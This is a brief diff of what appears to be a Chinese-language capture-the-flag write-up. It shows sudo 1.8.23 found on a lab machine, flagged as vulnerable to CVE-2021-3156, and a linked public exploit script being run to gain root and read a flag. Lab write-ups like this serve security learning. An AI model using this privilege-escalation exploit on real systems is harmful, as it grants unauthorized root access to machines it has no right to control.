@@ -31,5 +31,8 @@ uid=1000(sublarge) gid=1000(sublarge) groups=1000(sublarge)
 看opt
 sublarge@lanSSudoyy:/opt$ ls
 sudo-1.8.23
-存在CVE-2021-3156漏洞
-[exploit](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py)
+存在CVE-2021-3156漏洞[exploit](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py)
+sublarge@lanSSudoyy:~$ ./exploit_nss.py 
+id
+uid=0(root) gid=0(root) groups=0(root),1000(sublarge)
+flag{root-fjskldjk;dajfsa;lfdsajkfl}
